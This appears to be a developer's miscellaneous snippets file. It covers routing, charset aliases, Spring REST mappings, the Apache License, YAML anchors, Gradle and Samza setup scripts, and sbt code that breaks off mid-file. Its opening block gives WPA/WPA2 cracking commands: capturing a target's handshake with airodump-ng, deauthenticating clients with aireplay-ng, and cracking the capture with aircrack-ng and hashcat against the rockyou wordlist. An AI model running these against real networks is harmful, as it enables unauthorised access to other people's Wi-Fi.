curl -L -o rockyou.txt https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt

# download
git clone https://github.com/brannondorsey/naive-hashcat
cd naive-hashcat

# download the 134MB rockyou dictionary file
curl -L -o dicts/rockyou.txt https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt

# crack ! baby ! crack !
# 2500 is the hashcat hash mode for WPA/WPA2
HASH_FILE=hackme.hccapx POT_FILE=hackme.pot HASH_TYPE=2500 ./naive-hashcat.sh

cap2hccapx.bin hackme.cap hackme.hccapx

# replace -c and --bssid values with the values of your target network
# -w specifies the directory where we will save the packet capture
airodump-ng -c 3 --bssid 9C:5C:8E:C9:AB:C0 -w . mon0

airodump-ng -c [channel] --bssid [bssid] -w /root/Desktop/ [monitor interface]
aireplay-ng –0 2 –a [router bssid] –c [client bssid] mon0
aircrack-ng -a2 -b [router bssid] -w [path to wordlist] /root/Desktop/*.cap
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
#### ROUTE
--------------------------------------------------------------------------------------------------------
route add 10.1.1.140 netmask 255.255.255.255 <defaultGW> -P
route print
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
#### MISC
--------------------------------------------------------------------------------------------------------
mvn dependency:purge-local-repository
--------------------------------------------------------------------------------------------------------
    Cp1251:
        Windows-1251 
    Cp866:
        IBM866
        IBM-866
        866
        CP866
        CSIBM866 
    KOI8_R:
        KOI8-R
        KOI8
        CSKOI8R 
    ISO8859_5:
        ISO8859-5
        ISO-8859-5
        ISO_8859-5
        ISO_8859-5:1988
        ISO-IR-144
        8859_5
        Cyrillic
        CSISOLatinCyrillic
        IBM915
        IBM-915
        Cp915
        915 
--------------------------------------------------------------------------------------------------------
CREATE DATABASE 'E:\ProjectHolding\DataBase\HOLDING.GDB' PAGE_SIZE 4096
DEFAULT CHARACTER SET UNICODE_FSS;

CREATE TABLE RUSSIAN_WORD
(
 "NAME1"  VARCHAR(40) CHARACTER SET UNICODE_FSS NOT NULL,
 "NAME2"  VARCHAR(40) CHARACTER SET WIN1251 NOT NULL,
 PRIMARY KEY ("NAME1")
);
--------------------------------------------------------------------------------------------------------
import java.util.Properties;

import javax.mail.Session;
import javax.mail.Message;
import javax.mail.Transport;
import javax.mail.internet.MimeMessage;
import javax.mail.internet.InternetAddress;

public class MailTest
{
 static final String ENCODING = "koi8-r";
 static final String FROM = "myaccount@mydomail.ru";
 static final String TO = "myaccount@mydomail.ru";

 public static void main(String args[]) throws Exception
 {
  Properties mailProps = new Properties();

  mailProps.put("mail.store.protocol","pop3");
  mailProps.put("mail.transport.protocol","smtp");
  mailProps.put("mail.user","myaccount");

  mailProps.put("mail.pop3.host","mail.mydomail.ru");
  mailProps.put("mail.smtp.host","mail.mydomail.ru");

  Session session = Session.getDefaultInstance(mailProps);

  MimeMessage message = new MimeMessage(session);
  message.setFrom(new InternetAddress(FROM));
  message.setRecipient(Message.RecipientType.TO, new InternetAddress(TO));

  message.setSubject("Тестовое письмо",ENCODING);
  message.setText("Текст тестового письма",ENCODING);

  Transport.send(message);
 }
}
--------------------------------------------------------------------------------------------------------
mode con cp select=1251
new String(mailInfo.getBody().getBytes("cp1251"), StandardCharsets.UTF_16)
javac -encoding=KOI8_R
--------------------------------------------------------------------------------------------------------
git -c diff.mnemonicprefix=false -c core.quotepath=false stash apply stash@{0}
--------------------------------------------------------------------------------------------------------
curl -i http://localhost:8080/spring-rest/ex/foos
curl -i -X POST http://localhost:8080/spring-rest/ex/foos
curl -i -H "key:val" http://localhost:8080/spring-rest/ex/foos
curl -i -d id=100 http://localhost:8080/spring-rest/ex/bars
curl -H "Accept:application/json,text/html" http://localhost:8080/spring-rest/ex/foos
curl -i -H "key1:val1" -H "key2:val2" http://localhost:8080/spring-rest/ex/foos

@RequestMapping(value = "/ex/foos", headers = "key=val", method = GET)
@ResponseBody
public String getFoosWithHeader() {
    return "Get some Foos with Header";
}

@RequestMapping(
  value = "/ex/foos", 
  method = GET, 
  headers = "Accept=application/json")
@ResponseBody
public String getFoosAsJsonFromBrowser() {
    return "Get some Foos with Header Old";
}

@RequestMapping(
  value = "/ex/foos", 
  method = GET,
  produces = { "application/json", "application/xml" }
)

@RequestMapping(value = "/ex/bars/{numericId:[\\d]+}", method = GET)
@ResponseBody
public String getBarsBySimplePathWithPathVariable(
  @PathVariable long numericId) {
    return "Get a specific Bar with id=" + numericId;
}

@RequestMapping(value = "/ex/bars", method = GET)
@ResponseBody
public String getBarBySimplePathWithRequestParam(
  @RequestParam("id") long id) {
    return "Get a specific Bar with id=" + id;
}

@RequestMapping(
  value = "/ex/bars", 
  params = { "id", "second" }, 
  method = GET)
@ResponseBody
public String getBarBySimplePathWithExplicitRequestParams(
  @RequestParam("id") long id) {
    return "Narrow Get a specific Bar with id=" + id;
}

@RequestMapping(
  value = { "/ex/advanced/bars", "/ex/advanced/foos" }, 
  method = GET)
@ResponseBody
public String getFoosOrBarsByPath() {
    return "Advanced - Get some Foos or Bars";
}

@RequestMapping(
  value = "/ex/foos/multiple", 
  method = { RequestMethod.PUT, RequestMethod.POST }
)
@ResponseBody
public String putAndPostFoos() {
    return "Advanced - PUT and POST within single method";
}

@RequestMapping(value = "*", method = RequestMethod.GET)
@ResponseBody
public String getFallback() {
    return "Fallback for GET Requests";
}

@RequestMapping(
  value = "*", 
  method = { RequestMethod.GET, RequestMethod.POST ... })
@ResponseBody
public String allFallback() {
    return "Fallback for All Requests";
}

@GetMapping(value = "foos/duplicate", produces = MediaType.APPLICATION_XML_VALUE)
public String duplicate() {
    return "Duplicate";
}
 
@GetMapping(value = "foos/duplicate", produces = MediaType.APPLICATION_JSON_VALUE)
public String duplicateEx() {
    return "Duplicate";
}
--------------------------------------------------------------------------------------------------------
gradle install -Dmaven.repo.local=the/path/of/the/folder
--------------------------------------------------------------------------------------------------------

                                 Apache License
                           Version 2.0, January 2004
                        http://www.apache.org/licenses/

   TERMS AND CONDITIONS FOR USE, REPRODUCTION, AND DISTRIBUTION

   1. Definitions.

      "License" shall mean the terms and conditions for use, reproduction,
      and distribution as defined by Sections 1 through 9 of this document.

      "Licensor" shall mean the copyright owner or entity authorized by
      the copyright owner that is granting the License.

      "Legal Entity" shall mean the union of the acting entity and all
      other entities that control, are controlled by, or are under common
      control with that entity. For the purposes of this definition,
      "control" means (i) the power, direct or indirect, to cause the
      direction or management of such entity, whether by contract or
      otherwise, or (ii) ownership of fifty percent (50%) or more of the
      outstanding shares, or (iii) beneficial ownership of such entity.

      "You" (or "Your") shall mean an individual or Legal Entity
      exercising permissions granted by this License.

      "Source" form shall mean the preferred form for making modifications,
      including but not limited to software source code, documentation
      source, and configuration files.

      "Object" form shall mean any form resulting from mechanical
      transformation or translation of a Source form, including but
      not limited to compiled object code, generated documentation,
      and conversions to other media types.

      "Work" shall mean the work of authorship, whether in Source or
      Object form, made available under the License, as indicated by a
      copyright notice that is included in or attached to the work
      (an example is provided in the Appendix below).

      "Derivative Works" shall mean any work, whether in Source or Object
      form, that is based on (or derived from) the Work and for which the
      editorial revisions, annotations, elaborations, or other modifications
      represent, as a whole, an original work of authorship. For the purposes
      of this License, Derivative Works shall not include works that remain
      separable from, or merely link (or bind by name) to the interfaces of,
      the Work and Derivative Works thereof.

      "Contribution" shall mean any work of authorship, including
      the original version of the Work and any modifications or additions
      to that Work or Derivative Works thereof, that is intentionally
      submitted to Licensor for inclusion in the Work by the copyright owner
      or by an individual or Legal Entity authorized to submit on behalf of
      the copyright owner. For the purposes of this definition, "submitted"
      means any form of electronic, verbal, or written communication sent
      to the Licensor or its representatives, including but not limited to
      communication on electronic mailing lists, source code control systems,
      and issue tracking systems that are managed by, or on behalf of, the
      Licensor for the purpose of discussing and improving the Work, but
      excluding communication that is conspicuously marked or otherwise
      designated in writing by the copyright owner as "Not a Contribution."

      "Contributor" shall mean Licensor and any individual or Legal Entity
      on behalf of whom a Contribution has been received by Licensor and
      subsequently incorporated within the Work.

   2. Grant of Copyright License. Subject to the terms and conditions of
      this License, each Contributor hereby grants to You a perpetual,
      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
      copyright license to reproduce, prepare Derivative Works of,
      publicly display, publicly perform, sublicense, and distribute the
      Work and such Derivative Works in Source or Object form.

   3. Grant of Patent License. Subject to the terms and conditions of
      this License, each Contributor hereby grants to You a perpetual,
      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
      (except as stated in this section) patent license to make, have made,
      use, offer to sell, sell, import, and otherwise transfer the Work,
      where such license applies only to those patent claims licensable
      by such Contributor that are necessarily infringed by their
      Contribution(s) alone or by combination of their Contribution(s)
      with the Work to which such Contribution(s) was submitted. If You
      institute patent litigation against any entity (including a
      cross-claim or counterclaim in a lawsuit) alleging that the Work
      or a Contribution incorporated within the Work constitutes direct
      or contributory patent infringement, then any patent licenses
      granted to You under this License for that Work shall terminate
      as of the date such litigation is filed.

   4. Redistribution. You may reproduce and distribute copies of the
      Work or Derivative Works thereof in any medium, with or without
      modifications, and in Source or Object form, provided that You
      meet the following conditions:

      (a) You must give any other recipients of the Work or
          Derivative Works a copy of this License; and

      (b) You must cause any modified files to carry prominent notices
          stating that You changed the files; and

      (c) You must retain, in the Source form of any Derivative Works
          that You distribute, all copyright, patent, trademark, and
          attribution notices from the Source form of the Work,
          excluding those notices that do not pertain to any part of
          the Derivative Works; and

      (d) If the Work includes a "NOTICE" text file as part of its
          distribution, then any Derivative Works that You distribute must
          include a readable copy of the attribution notices contained
          within such NOTICE file, excluding those notices that do not
          pertain to any part of the Derivative Works, in at least one
          of the following places: within a NOTICE text file distributed
          as part of the Derivative Works; within the Source form or
          documentation, if provided along with the Derivative Works; or,
          within a display generated by the Derivative Works, if and
          wherever such third-party notices normally appear. The contents
          of the NOTICE file are for informational purposes only and
          do not modify the License. You may add Your own attribution
          notices within Derivative Works that You distribute, alongside
          or as an addendum to the NOTICE text from the Work, provided
          that such additional attribution notices cannot be construed
          as modifying the License.

      You may add Your own copyright statement to Your modifications and
      may provide additional or different license terms and conditions
      for use, reproduction, or distribution of Your modifications, or
      for any such Derivative Works as a whole, provided Your use,
      reproduction, and distribution of the Work otherwise complies with
      the conditions stated in this License.

   5. Submission of Contributions. Unless You explicitly state otherwise,
      any Contribution intentionally submitted for inclusion in the Work
      by You to the Licensor shall be under the terms and conditions of
      this License, without any additional terms or conditions.
      Notwithstanding the above, nothing herein shall supersede or modify
      the terms of any separate license agreement you may have executed
      with Licensor regarding such Contributions.

   6. Trademarks. This License does not grant permission to use the trade
      names, trademarks, service marks, or product names of the Licensor,
      except as required for reasonable and customary use in describing the
      origin of the Work and reproducing the content of the NOTICE file.

   7. Disclaimer of Warranty. Unless required by applicable law or
      agreed to in writing, Licensor provides the Work (and each
      Contributor provides its Contributions) on an "AS IS" BASIS,
      WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or
      implied, including, without limitation, any warranties or conditions
      of TITLE, NON-INFRINGEMENT, MERCHANTABILITY, or FITNESS FOR A
      PARTICULAR PURPOSE. You are solely responsible for determining the
      appropriateness of using or redistributing the Work and assume any
      risks associated with Your exercise of permissions under this License.

   8. Limitation of Liability. In no event and under no legal theory,
      whether in tort (including negligence), contract, or otherwise,
      unless required by applicable law (such as deliberate and grossly
      negligent acts) or agreed to in writing, shall any Contributor be
      liable to You for damages, including any direct, indirect, special,
      incidental, or consequential damages of any character arising as a
      result of this License or out of the use or inability to use the
      Work (including but not limited to damages for loss of goodwill,
      work stoppage, computer failure or malfunction, or any and all
      other commercial damages or losses), even if such Contributor
      has been advised of the possibility of such damages.

   9. Accepting Warranty or Additional Liability. While redistributing
      the Work or Derivative Works thereof, You may choose to offer,
      and charge a fee for, acceptance of support, warranty, indemnity,
      or other liability obligations and/or rights consistent with this
      License. However, in accepting such obligations, You may act only
      on Your own behalf and on Your sole responsibility, not on behalf
      of any other Contributor, and only if You agree to indemnify,
      defend, and hold each Contributor harmless for any liability
      incurred by, or claims asserted against, such Contributor by reason
      of your accepting any such warranty or additional liability.

   END OF TERMS AND CONDITIONS

   APPENDIX: How to apply the Apache License to your work.

      To apply the Apache License to your work, attach the following
      boilerplate notice, with the fields enclosed by brackets "[]"
      replaced with your own identifying information. (Don't include
      the brackets!)  The text should be enclosed in the appropriate
      comment syntax for the file format. We also recommend that a
      file or class name and description of purpose be included on the
      same "printed page" as the copyright notice for easier
      identification within third-party archives.

   Copyright [yyyy] [name of copyright owner]

   Licensed under the Apache License, Version 2.0 (the "License");
   you may not use this file except in compliance with the License.
   You may obtain a copy of the License at

       http://www.apache.org/licenses/LICENSE-2.0

   Unless required by applicable law or agreed to in writing, software
   distributed under the License is distributed on an "AS IS" BASIS,
   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
   See the License for the specific language governing permissions and
   limitations under the License.
--------------------------------------------------------------------------------------------------------


---

- &CENTER { x: 1, y: 2 }

- &LEFT { x: 0, y: 2 }

- &BIG { r: 10 }

- &SMALL { r: 1 }

 

# All the following maps are equal:

 

- # Explicit keys

  x: 1

  y: 2

  r: 10

  label: center/big

 

- # Merge one map

  << : *CENTER

  r: 10

  label: center/big

 

- # Merge multiple maps

  << : [ *CENTER, *BIG ]

  label: center/big

 

- # Override

  << : [ *BIG, *LEFT, *SMALL ]

  x: 1

  label: center/big
--------------------------------------------------------------------------------------------------------
default: &DEFAULT

  URL:          stooges.com

  throw_pies?:  true 

  stooges:  &stooge_list

    larry:  first_stooge

    moe:    second_stooge

    curly:  third_stooge

 

development:

  <<: *DEFAULT

  URL:      stooges.local

  stooges:

    shemp: fourth_stooge

 

test:

  <<: *DEFAULT

  URL:    test.stooges.qa

  stooges:

    <<: *stooge_list

    shemp: fourth_stooge
--------------------------------------------------------------------------------------------------------
mvn <goals> -rf :diffy-processor
--------------------------------------------------------------------------------------------------------
-Djavax.net.debug=ssl,handshake -Djavax.net.ssl.keyStoreType=PKCS12 -Djavax.net.ssl.keyStore=our-client-certs -Djavax.net.ssl.trustStoreType=jks -Djavax.net.ssl.trustStore=their-server-certs
keytool -keystore ..\lib\security\cacerts -import -alias your.ssl.server.name -file .\relative-path-to-cert-file\your.ssl.server.name.crt

java -Djavax.net.ssl.trustStore="C:/Program Files/Java/jdk1.8.0_66/jre/lib/security/cacerts" -jar jenkins.war 
java -Djavax.net.ssl.trustStore -jar jenkins.war
--------------------------------------------------------------------------------------------------------
#!/bin/sh
cd $(dirname $0)

cd ../complete

mvn clean package
ret=$?
if [ $ret -ne 0 ]; then
exit $ret
fi
rm -rf target

./gradlew build
ret=$?
if [ $ret -ne 0 ]; then
exit $ret
fi
rm -rf build

cd ../initial

mvn clean compile
ret=$?
if [ $ret -ne 0 ]; then
exit $ret
fi
rm -rf target

./gradlew compileJava
ret=$?
if [ $ret -ne 0 ]; then
exit $ret
fi
rm -rf build

exit
--------------------------------------------------------------------------------------------------------
@if "%DEBUG%" == "" @echo off
@rem ##########################################################################
@rem
@rem  Gradle startup script for Windows
@rem
@rem ##########################################################################

@rem Set local scope for the variables with windows NT shell
if "%OS%"=="Windows_NT" setlocal

set DIRNAME=%~dp0
if "%DIRNAME%" == "" set DIRNAME=.
set APP_BASE_NAME=%~n0
set APP_HOME=%DIRNAME%

@rem Add default JVM options here. You can also use JAVA_OPTS and GRADLE_OPTS to pass JVM options to this script.
set DEFAULT_JVM_OPTS=

@rem Find java.exe
if defined JAVA_HOME goto findJavaFromJavaHome

set JAVA_EXE=java.exe
%JAVA_EXE% -version >NUL 2>&1
if "%ERRORLEVEL%" == "0" goto init

echo.
echo ERROR: JAVA_HOME is not set and no 'java' command could be found in your PATH.
echo.
echo Please set the JAVA_HOME variable in your environment to match the
echo location of your Java installation.

goto fail

:findJavaFromJavaHome
set JAVA_HOME=%JAVA_HOME:"=%
set JAVA_EXE=%JAVA_HOME%/bin/java.exe

if exist "%JAVA_EXE%" goto init

echo.
echo ERROR: JAVA_HOME is set to an invalid directory: %JAVA_HOME%
echo.
echo Please set the JAVA_HOME variable in your environment to match the
echo location of your Java installation.

goto fail

:init
@rem Get command-line arguments, handling Windows variants

if not "%OS%" == "Windows_NT" goto win9xME_args
if "%@eval[2+2]" == "4" goto 4NT_args

:win9xME_args
@rem Slurp the command line arguments.
set CMD_LINE_ARGS=
set _SKIP=2

:win9xME_args_slurp
if "x%~1" == "x" goto execute

set CMD_LINE_ARGS=%*
goto execute

:4NT_args
@rem Get arguments from the 4NT Shell from JP Software
set CMD_LINE_ARGS=%$

:execute
@rem Setup the command line

set CLASSPATH=%APP_HOME%\gradle\wrapper\gradle-wrapper.jar

@rem Execute Gradle
"%JAVA_EXE%" %DEFAULT_JVM_OPTS% %JAVA_OPTS% %GRADLE_OPTS% "-Dorg.gradle.appname=%APP_BASE_NAME%" -classpath "%CLASSPATH%" org.gradle.wrapper.GradleWrapperMain %CMD_LINE_ARGS%

:end
@rem End local scope for the variables with windows NT shell
if "%ERRORLEVEL%"=="0" goto mainEnd

:fail
rem Set variable GRADLE_EXIT_CONSOLE if you need the _script_ return code instead of
rem the _cmd.exe /c_ return code!
if  not "" == "%GRADLE_EXIT_CONSOLE%" exit 1
exit /b 1

:mainEnd
if "%OS%"=="Windows_NT" endlocal

:omega
--------------------------------------------------------------------------------------------------------
import static org.assertj.core.api.Assertions.assertThat;

import org.junit.Test;
import org.junit.runner.RunWith;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.test.context.junit4.SpringRunner;
import org.springframework.web.client.RestTemplate;

@RunWith(SpringRunner.class)
//@DataJpaTest
@SpringBootTest(webEnvironment = WebEnvironment.RANDOM_PORT, classes = { com.ubs.api.rest.jenkins.loader.AppLoader })
public class BaseTest {

	@After
	public void init(){
	}

	@Before
	public void destroy(){
	}
	
	@Autowired
	private RestTemplate restTemplate;

	@Test
	public void contextLoads() {
		assertThat(restTemplate).isNotNull();
	}
}
--------------------------------------------------------------------------------------------------------
imports:
    ansible: ansible
    ansible_playbooks: oss-playbooks

curl module ansible:
    # Equivalent of git cloning tags/v1.6.6 but much, much faster
    url: https://codeload.github.com/ansible/ansible/zip/69d85c22c7475ccf8169b6ec9dee3ee28c92a314
    unpack: zip
    export: ansible-69d85c22c7475ccf8169b6ec9dee3ee28c92a314

git module ansible_playbooks:
    url: https://github.com/snowplow/ansible-playbooks.git
    # Comment out to fetch a specific rev instead of master:
    # rev: xxx
--------------------------------------------------------------------------------------------------------
#!/bin/bash -e
# Licensed to the Apache Software Foundation (ASF) under one
# or more contributor license agreements.  See the NOTICE file
# distributed with this work for additional information
# regarding copyright ownership.  The ASF licenses this file
# to you under the Apache License, Version 2.0 (the
# "License"); you may not use this file except in compliance
# with the License.  You may obtain a copy of the License at
#
#   http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing,
# software distributed under the License is distributed on an
# "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
# KIND, either express or implied.  See the License for the
# specific language governing permissions and limitations
# under the License.

# This script will download, setup, start, and stop servers for Kafka, YARN, and ZooKeeper,
# as well as downloading, building and locally publishing Samza

export JAVA_HOME="$(dirname $(dirname $(readlink -f `which javac`)))"

DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )"
BASE_DIR=$(dirname $DIR)
DEPLOY_ROOT_DIR=$BASE_DIR/vagrant/grid-deploy
DOWNLOAD_CACHE_DIR=$HOME/.samza/download
COMMAND=$1
SYSTEM=$2

DOWNLOAD_KAFKA=http://www.us.apache.org/dist/kafka/0.8.2.1/kafka_2.10-0.8.2.1.tgz
DOWNLOAD_YARN=https://archive.apache.org/dist/hadoop/common/hadoop-2.4.0/hadoop-2.4.0.tar.gz
DOWNLOAD_ZOOKEEPER=http://archive.apache.org/dist/zookeeper/zookeeper-3.4.3/zookeeper-3.4.3.tar.gz

bootstrap() {
  echo "Bootstrapping the system..."
  stop_all
  rm -rf "$DEPLOY_ROOT_DIR"
  mkdir "$DEPLOY_ROOT_DIR"
  install_all
  start_all
  exit 0
}

install_all() {
  $DIR/grid install zookeeper
  $DIR/grid install yarn
  $DIR/grid install kafka
}

install_zookeeper() {
  mkdir -p "$DEPLOY_ROOT_DIR"
  install zookeeper $DOWNLOAD_ZOOKEEPER zookeeper-3.4.3
  cp "$DEPLOY_ROOT_DIR/zookeeper/conf/zoo_sample.cfg" "$DEPLOY_ROOT_DIR/zookeeper/conf/zoo.cfg"
}

install_yarn() {
  mkdir -p "$DEPLOY_ROOT_DIR"
  install yarn $DOWNLOAD_YARN hadoop-2.4.0
  cp "$BASE_DIR/vagrant/etc/yarn-site.xml" "$DEPLOY_ROOT_DIR/yarn/etc/hadoop/yarn-site.xml"
  if [ ! -f "$HOME/.samza/conf/yarn-site.xml" ]; then
    mkdir -p "$HOME/.samza/conf"
    cp "$BASE_DIR/vagrant/etc/yarn-site.xml" "$HOME/.samza/conf/yarn-site.xml"
  fi
}

install_kafka() {
  mkdir -p "$DEPLOY_ROOT_DIR"
  install kafka $DOWNLOAD_KAFKA kafka_2.10-0.8.2.1
  # have to use SIGTERM since nohup on appears to ignore SIGINT
  # and Kafka switched to SIGINT in KAFKA-1031.
  sed -i.bak 's/SIGINT/SIGTERM/g' $DEPLOY_ROOT_DIR/kafka/bin/kafka-server-stop.sh
  # in order to simplify the wikipedia-stats example job, set topic to have just 1 partition by default
  sed -i.bak 's/^num\.partitions *=.*/num.partitions=1/' $DEPLOY_ROOT_DIR/kafka/config/server.properties
}

install() {
  DESTINATION_DIR="$DEPLOY_ROOT_DIR/$1"
  DOWNLOAD_URL=$2
  PACKAGE_DIR="$DOWNLOAD_CACHE_DIR/$3"
  PACKAGE_FILE="$DOWNLOAD_CACHE_DIR/$(basename $DOWNLOAD_URL)"
  if [ -f "$PACKAGE_FILE" ]; then
    echo "Using previously downloaded file $PACKAGE_FILE"
  else
    echo "Downloading $(basename $DOWNLOAD_URL)..."
    mkdir -p $DOWNLOAD_CACHE_DIR
    curl "$DOWNLOAD_URL" > "${PACKAGE_FILE}.tmp"
    mv "${PACKAGE_FILE}.tmp" "$PACKAGE_FILE"
  fi
  rm -rf "$DESTINATION_DIR" "$PACKAGE_DIR"
  tar -xf "$PACKAGE_FILE" -C $DOWNLOAD_CACHE_DIR
  mv "$PACKAGE_DIR" "$DESTINATION_DIR"
}

start_all() {
  $DIR/grid start zookeeper
  $DIR/grid start yarn
  $DIR/grid start kafka
}

start_zookeeper() {
  if [ -f $DEPLOY_ROOT_DIR/$SYSTEM/bin/zkServer.sh ]; then
    cd $DEPLOY_ROOT_DIR/$SYSTEM
    bin/zkServer.sh start
    cd - > /dev/null
  else
    echo 'Zookeeper is not installed. Run: bin/grid install zookeeper'
  fi
}

start_yarn() {
  if [ -f $DEPLOY_ROOT_DIR/$SYSTEM/sbin/yarn-daemon.sh ]; then
    $DEPLOY_ROOT_DIR/$SYSTEM/sbin/yarn-daemon.sh start resourcemanager
    $DEPLOY_ROOT_DIR/$SYSTEM/sbin/yarn-daemon.sh start nodemanager
  else
    echo 'YARN is not installed. Run: bin/grid install yarn'
  fi
}

start_kafka() {
  if [ -f $DEPLOY_ROOT_DIR/$SYSTEM/bin/kafka-server-start.sh ]; then
    mkdir -p $DEPLOY_ROOT_DIR/$SYSTEM/logs
    cd $DEPLOY_ROOT_DIR/$SYSTEM
    nohup bin/kafka-server-start.sh config/server.properties > logs/kafka.log 2>&1 &
    cd - > /dev/null
  else
    echo 'Kafka is not installed. Run: bin/grid install kafka'
  fi
}

stop_all() {
  $DIR/grid stop kafka
  $DIR/grid stop yarn
  $DIR/grid stop zookeeper
}

stop_zookeeper() {
  if [ -f $DEPLOY_ROOT_DIR/$SYSTEM/bin/zkServer.sh ]; then
    cd $DEPLOY_ROOT_DIR/$SYSTEM
    bin/zkServer.sh stop
    cd - > /dev/null
  else
    echo 'Zookeeper is not installed. Run: bin/grid install zookeeper'
  fi
}

stop_yarn() {
  if [ -f $DEPLOY_ROOT_DIR/$SYSTEM/sbin/yarn-daemon.sh ]; then
    $DEPLOY_ROOT_DIR/$SYSTEM/sbin/yarn-daemon.sh stop resourcemanager
    $DEPLOY_ROOT_DIR/$SYSTEM/sbin/yarn-daemon.sh stop nodemanager
  else
    echo 'YARN is not installed. Run: bin/grid install yarn'
  fi
}

stop_kafka() {
  if [ -f $DEPLOY_ROOT_DIR/$SYSTEM/bin/kafka-server-stop.sh ]; then
    cd $DEPLOY_ROOT_DIR/$SYSTEM
    bin/kafka-server-stop.sh || true # tolerate nonzero exit status if Kafka isn't running
    cd - > /dev/null
  else
    echo 'Kafka is not installed. Run: bin/grid install kafka'
  fi
}

# Check arguments
if [ "$COMMAND" == "bootstrap" ] && test -z "$SYSTEM"; then
  bootstrap
  exit 0
elif (test -z "$COMMAND" && test -z "$SYSTEM") \
  || ( [ "$COMMAND" == "help" ] || test -z "$COMMAND" || test -z "$SYSTEM"); then
  echo
  echo "  Usage.."
  echo
  echo "  $ grid"
  echo "  $ grid bootstrap"
  echo "  $ grid install [yarn|kafka|zookeeper|all]"
  echo "  $ grid start [yarn|kafka|zookeeper|all]"
  echo "  $ grid stop [yarn|kafka|zookeeper|all]"
  echo
  exit 1
else
  echo "EXECUTING: $COMMAND $SYSTEM"

  "$COMMAND"_"$SYSTEM"
fi
--------------------------------------------------------------------------------------------------------
#!/bin/bash
set -e

vagrant_dir=/vagrant/vagrant
bashrc=/home/vagrant/.bashrc

echo "========================================"
echo "INSTALLING PERU AND ANSIBLE DEPENDENCIES"
echo "----------------------------------------"
apt-get update
apt-get install -y language-pack-en git unzip libyaml-dev python3-pip python-yaml python-paramiko python-jinja2

echo "==============="
echo "INSTALLING PERU"
echo "---------------"
sudo pip3 install peru

echo "======================================="
echo "CLONING ANSIBLE AND PLAYBOOKS WITH PERU"
echo "---------------------------------------"
cd ${vagrant_dir} && peru sync -v
echo "... done"

env_setup=${vagrant_dir}/ansible/hacking/env-setup
hosts=${vagrant_dir}/ansible.hosts

echo "==================="
echo "CONFIGURING ANSIBLE"
echo "-------------------"
touch ${bashrc}
echo "source ${env_setup}" >> ${bashrc}
echo "export ANSIBLE_HOSTS=${hosts}" >> ${bashrc}
echo "... done"

echo "=========================================="
echo "RUNNING PLAYBOOKS WITH ANSIBLE*"
echo "* no output while each playbook is running"
echo "------------------------------------------"
while read pb; do
    su - -c "source ${env_setup} && ${vagrant_dir}/ansible/bin/ansible-playbook ${vagrant_dir}/${pb} --connection=local --inventory-file=${hosts}" vagrant
done <${vagrant_dir}/up.playbooks

guidance=${vagrant_dir}/up.guidance

if [ -f ${guidance} ]; then
    echo "==========="
    echo "PLEASE READ"
    echo "-----------"
    cat $guidance
fi
--------------------------------------------------------------------------------------------------------
/* 
 * Copyright (c) 2015 Tim Harper.
 */
import sbt._
import Keys._

import xerial.sbt.Pack._

object SamzaTasks {

  private object RenderConfigTask {
    val key = TaskKey[Unit]("renderConfig", "Samza: renders the config file template", rank = KeyRanks.ATask)
    val setting = key := {
      val s = streams.value
      val packPath = pack.value
      for (f <- ((sourceDirectory in Compile).value / "config" * "*.properties").get) yield {
        val output = packPath / "config" / f.getName
        val template = IO.read(f)

        IO.write(
          output,
          template.
            replace("${target}", (target in Compile).value.getCanonicalPath).
            replace("${project.artifactId}", name.value).
            replace("${pom.version}", version.value)
        )
        s.log.info(s"Generated ${output} from ${f}")
      }
    }
  }

  private object GetSamzaShellTask {
    val key = TaskKey[File]("getSamzaShell", "Samza: sources the samza-shell artifact", rank = KeyRanks.ATask)
    val setting = key := {
      val samzaShellFile = (target in Compile).value / s"samza-shell-0.9.1-dist.tgz"
      if (! samzaShellFile.exists)
